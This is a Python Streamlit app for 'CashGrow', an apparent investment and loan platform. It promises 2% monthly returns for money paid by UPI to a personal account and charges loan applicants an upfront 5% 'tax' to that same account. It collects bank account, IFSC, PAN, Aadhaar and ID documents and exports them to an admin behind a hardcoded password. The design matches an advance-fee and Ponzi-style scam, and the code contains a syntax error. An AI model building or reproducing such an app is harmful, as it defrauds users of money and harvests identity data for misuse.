import streamlit as st
import pandas as pd
import datetime
import uuid
import urllib

# Initialize session state
if "investments" not in st.session_state:
    st.session_state.investments = []

if "loans" not in st.session_state:
    st.session_state.loans = []

if "admin_mode" not in st.session_state:
    st.session_state.admin_mode = False

st.title("💰 CashGrow: Invest & Borrow Platform")

st.sidebar.title("🔐 Admin Access")
admin_pass = st.sidebar.text_input("Enter Admin Password", type="password")
if admin_pass == "admin123":
    st.sidebar.success("Admin Mode Enabled")
    st.session_state.admin_mode = True
else:
    st.session_state.admin_mode = False

st.header("📊 Choose Your Action")
tab1, tab2 = st.tabs(["🚀 Invest Money", "📥 Apply for Loan"])

# ---------------------- INVESTMENT SECTION ----------------------
with tab1:
    st.subheader("🚀 Invest Money & Earn 2% Monthly")
    invest_amount = st.number_input("Enter amount to invest (₹)", min_value=500, step=100)
    if invest_amount:
        reward = invest_amount * 0.02
        return_date = (datetime.datetime.now() + datetime.timedelta(days=30)).strftime("%Y-%m-%d")

        st.info(f"📈 You'll earn ₹{reward:.2f} after 30 days.")
        st.write(f"📅 Return will be credited on: **{return_date}**")

        st.markdown("---")
        st.markdown("### 📲 Step 1: Make Payment to UPI")

        upi_url = f"upi://pay?pa=ayushbhradwaj009-1@okicici&pn=AyushBhardwaj&am={invest_amount}&cu=INR"
        qr_url = f"https://api.qrserver.com/v1/create-qr-code/?size=300x300&data={urllib.parse.quote(upi_url)}"
        st.image(qr_url, caption="Scan to Pay", use_container_width=True)

        st.code("ayushbhradwaj009-1@okicici", language="text")

        confirm = st.checkbox("✅ I have paid the amount")

        if confirm:
            name = st.text_input("Your Name")
            email = st.text_input("Email")
            upi_txn_id = st.text_input("UPI Transaction ID")
            if st.button("Submit for Admin Approval"):
                txn_id = str(uuid.uuid4())[:8]
                st.session_state.investments.append({
                    "Txn ID": txn_id,
                    "Name": name,
                    "Email": email,
                    "Amount": invest_amount,
                    "Reward": reward,
                    "Return Date": return_date,
                    "Approved": False,
                    "Submitted On": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "UPI Txn ID": upi_txn_id
                })
                st.success("Submitted successfully! Wait for admin approval.")

# ---------------------- LOAN SECTION ----------------------
with tab2:
    st.subheader("📥 Apply for a Loan")
    loan_amount = st.number_input("Enter loan amount (₹)", min_value=1000, step=500)
    if loan_amount:
        tax = 0.05 * loan_amount
        total_payable = loan_amount + tax
        st.warning(f"⚠️ You must pay ₹{total_payable:.2f} (₹{tax:.2f} is tax).")

        upi_url_loan = f"upi://pay?pa=ayushbhradwaj009-1@okicici&pn=AyushBhardwaj&am={total_payable}&cu=INR"
        qr_url_loan = f"https://api.qrserver.com/v1/create-qr-code/?size=300x300&data={urllib.parse.quote(upi_url_loan)}"
        st.image(qr_url_loan, caption="Scan to Pay", use_container_width=True)

        st.code("ayushbhradwaj009-1@okicici", language="text")

        loan_apply = st.checkbox("✅ apply for loan easily with cashpocket ")

        if loan_apply:
            name = st.text_input("Full Name")
            dob = st.text_input("Date Of Birth")
            acc_num = st.text_input("Bank Account Number")
            ifsc = st.text_input("IFSC Code")
            pan = st.text_input("PAN Number")            
            aadhaar = st.text_input("Aadhaar Number")
            contect_number = st.text_input("Contect Number")
            doc = st.file_uploader("Upload College ID)", type=["pdf", "jpg", "png"])

            if st.button("Submit Loan Application"):
                loan_id = str(uuid.uuid4())[:8]
                st.session_state.loans.append({
                    "Loan ID": loan_id,
                    "Name": name,
                    "Date OF Birth":dob
                    "
                    "Amount": loan_amount,
                    "Tax": tax,
                    "Bank Account": acc_num,
                    "IFSC": ifsc,
                    "PAN": pan,
                    "Aadhaar": aadhaar,
                    "Contect Number": contect_number,
                    "Submitted On": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                })
                st.success("Loan request submitted! Our team will review it.")

# ---------------------- ADMIN PANEL ----------------------
if st.session_state.admin_mode:
    st.header("👨‍💼 Admin Panel")

    with st.expander("📋 Pending Investor Approvals"):
        df = pd.DataFrame(st.session_state.investments)
        if not df.empty:
            for i, row in df.iterrows():
                if not row["Approved"]:
                    st.write(f"🔔 Investment from {row['Name']} of ₹{row['Amount']} | Txn ID: {row['Txn ID']}")
                    if st.button(f"Approve Txn {row['Txn ID']}", key=f"approve_{i}"):
                        st.session_state.investments[i]["Approved"] = True
                        st.success(f"✅ Approved Txn {row['Txn ID']}")
        else:
            st.info("No pending approvals.")

    with st.expander("📁 Download Investment Data"):
        st.download_button("Download CSV", pd.DataFrame(st.session_state.investments).to_csv(index=False),
                           file_name="investments.csv")

    with st.expander("📁 Download Loan Applications"):
        st.download_button("Download CSV", pd.DataFrame(st.session_state.loans).to_csv(index=False),
                           file_name="loans.csv")

# ---------------------- SUPPORT SECTION ----------------------
st.markdown("---")
st.markdown("### 📞 24X7 Customer Support ")

col1, col2 = st.columns(2)
with col1:
    st.markdown("**📧 Email:**")
    st.code("ayushbhradwaj009@gmail.com")

with col2:
    st.markdown("**📱 Contact Number:**")
    st.code("6201328257")

st.markdown("_Feel free to reach out with any queries regarding investment or loan requests._")

# ---------------------- CONTACT OPTIONS ----------------------
st.markdown("---")
st.markdown("### 📞 24X7 Contact Us Quickly")

# WhatsApp button
whatsapp_url = "https://wa.me/916201328257?text=Hi,%20I%20need%20assistance%20with%20my%20investment/loan!"
st.markdown(f"[📲 Chat with us on WhatsApp]( {whatsapp_url} )", unsafe_allow_html=True)

st.markdown("_You can reach us instantly via WhatsApp or email for any queries._")
st.markdown("<span style='font-size:24px; font-weight:bold'>AYUSH BHARDWAJ</span>", unsafe_allow_html=True)
st.markdown("<span style='font-size:24px; font-weight:bold'>RAGHVENDRA SINGH</span>", unsafe_allow_html=True)
